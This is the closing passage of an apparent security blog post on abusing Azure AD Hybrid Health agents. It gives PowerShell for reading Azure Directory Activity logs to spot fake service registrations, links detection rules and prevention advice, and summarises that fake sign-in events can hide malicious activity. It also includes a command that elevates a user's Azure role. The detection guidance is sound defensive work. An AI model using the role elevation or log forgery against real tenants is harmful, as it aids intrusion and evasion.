and <a href="https://github.com/search?q=repo%3AAzure%2FAzure-Sentinel+extension%3Ayaml+filename%3AAADHybridHealthADFSNewServer.yaml+filename%3AAADHybridHealthADFSServiceDelete.yaml+filename%3AAADHybridHealthADFSSuspApp.yaml+filename%3AAADHealthMonAgentRegKeyAccess.yaml+filename%3AAADHealthSvcAgentRegKeyAccess.yaml&type=Code&ref=advsearch&l=&l=" target="_blank">Azure Sentinel</a> rules for detecting access to agent key.


## Spoofing
This kind of activity, where you communicate with the cloud directly, is often hard to detect. In this case, with the information available at **ADFSSignInLog**, exploitation can't be detected at all.

## Registering fake services
As mentioned earlier, **registration events are not logged to the audit log**. However, the events are included in the **Directory Activity log** of any **Azure subscription** of the tenant:

![Azure Directory Activity log](/images/posts/hhealth_17.png)

How about the tenants without Azure subscription? Don't worry, I got you covered as **AADInternals v0.6.0** includes a function to view the Azure Directory Activity log items!

**Note:** If the tenant doesn't have Azure subscription, the user must have "Access management for Azure resources" switched on at <a href="https://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/Properties" target="_blank">Azure AD properties</a>
 or use **AADInternals** <a href="/aadinternals/#grant-aadintazureuseraccessadminrole-ac">Grant-AADIntAzureUserAccessAdminRole</a> function to switch it on.

![Azure AD properties](/images/posts/hhealth_18.png)

To get the Azure Directory Activity events use the following commands:

{{< highlight powershell >}}
# Get the access token and save to cache
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Optional: grant Azure User Access Administrator role (and wait for about 10 seconds for changes to take effect)
Grant-AADIntAzureUserAccessAdminRole

# Get the events for the last month
$events = Get-AADIntAzureDirectoryActivityLog -Start (Get-Date).AddDays(-31)

# Select ADHybridHealthService related events and extract relevant information
$events | where {$_.authorization.action -like "Microsoft.ADHybrid*"} | %{New-Object psobject -Property ([ordered]@{"Scope"=$_.authorization.scope;"Operation"=$_.operationName.localizedValue;"Caller"=$_.caller;"TimeStamp"=$_.eventTimeStamp;"IpAddress"=$_.httpRequest.clientIpAddress})} | ft
{{< /highlight>}}

**Output:**
{{< highlight text "hl_lines=3-12">}}
Scope                                                                                    Operation          Caller                               TimeStamp IpAddress                  
-----                                                                                    ---------          ------                               --------- ---------         
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:10:59.0148112Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:10:58.3348792Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:10:16.2093169Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:10:15.5693784Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:07:11.3219081Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:07:10.5819036Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:04:18.1500781Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:04:17.7750301Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService                                               Updates a service. admin@company.com 2021-08-25T15:02:33.2797177Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService                                               Updates a service. admin@company.com 2021-08-25T15:02:33.0297112Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts.company.com  Deletes service.   admin@company.com 2021-08-25T15:01:26.9612649Z 152.219.25.6
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts.company.com  Deletes service.   admin@company.com 2021-08-25T15:01:26.7262514Z 152.219.25.6
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts.company.com  Deletes service.   admin@company.com 2021-08-25T15:01:18.4399245Z 152.219.25.6
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts.company.com  Deletes service.   admin@company.com 2021-08-25T15:01:18.2599207Z 152.219.25.6
/providers/Microsoft.ADHybridHealthService                                               Updates a service. admin@company.com 2021-08-25T15:00:00.5760736Z 152.219.25.6
/providers/Microsoft.ADHybridHealthService                                               Updates a service. admin@company.com 2021-08-25T14:59:53.6402357Z 152.219.25.6
{{< /highlight>}}

The highlighted rows shows that modification requests are originating from a different ip address and thus indicates suspicious activity.

For automated detection, see <a href="https://twitter.com/Cyb3rWard0g" target="_blank">@Cyb3rWard0g</a>'s <a href="https://github.com/SigmaHQ/sigma/pull/1934" target="_blank">Sigma</a>
and <a href="https://github.com/search?q=repo%3AAzure%2FAzure-Sentinel+extension%3Ayaml+filename%3AAADHybridHealthADFSNewServer.yaml+filename%3AAADHybridHealthADFSServiceDelete.yaml+filename%3AAADHybridHealthADFSSuspApp.yaml+filename%3AAADHealthMonAgentRegKeyAccess.yaml+filename%3AAADHealthSvcAgentRegKeyAccess.yaml&type=Code&ref=advsearch&l=&l=" target="_blank">Azure Sentinel</a> rules!

# How to prevent

There are no special actions to take to prevent the exploitation. However, the two actions mentioned many many times earlier are still working:

* Treat AD FS servers as Tier 0 servers
* Limit the number of Global Administrators


# Summary 

Azure AD Hybrid Health agents are used to provide health status of hybrid on-prem services to Azure Portal. Since March 2021, also AD FS log-in events are sent to Azure AD and are available at Azure AD sign-ins log.

As I demonstrated in this blog, these kind of services can easily be exploited and used for sending arbitrary information to the target tenant. 
In this case, one can fill the Azure AD sign-ins log with fake log-in events to hide malicious activity. I also demonstrated how it was possible to tamper with the existing sign-in events before it was fixed by Microsoft.


# References
* Secureworks: <a href="https://www.secureworks.com/research/azure-active-directory-sign-ins-log-tampering" target="_blank">Azure Active Directory Sign-Ins Log Tampering</a>
* Microsoft: <a href="https://docs.microsoft.com/en-us/azure/active-directory/hybrid/whatis-azure-ad-connect#what-is-azure-ad-connect-health" target="_blank">What is Azure AD Connect Health?</a>
* Microsoft: <a href="https://techcommunity.microsoft.com/t5/azure-active-directory-identity/march-identity-updates-public-preview-of-ad-fs-sign-in-activity/ba-p/1994705" target="_blank">March identity updates – Public preview of AD FS sign-in activity in Azure AD reporting and more</a>
* Microsoft: <a href="https://docs.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-health-ad-fs-sign-in" target="_blank">AD FS sign-ins in Azure AD with Connect Health - preview</a>
* Roberto Rodriguez (@Cyb3rWard0g): <a href="https://github.com/SigmaHQ/sigma/pull/1934" target="_blank">SigmaHQ pull request #1934: Feature/aad health agent hybrid adfs services</a>
* Roberto Rodriguez (@Cyb3rWard0g): <a href="https://github.com/search?q=repo%3AAzure%2FAzure-Sentinel+extension%3Ayaml+filename%3AAADHybridHealthADFSNewServer.yaml+filename%3AAADHybridHealthADFSServiceDelete.yaml+filename%3AAADHybridHealthADFSSuspApp.yaml+filename%3AAADHealthMonAgentRegKeyAccess.yaml+filename%3AAADHealthSvcAgentRegKeyAccess.yaml&type=Code&ref=advsearch&l=&l=" target="_blank">Azure Sentinel AAD Hybrid Health rules</a>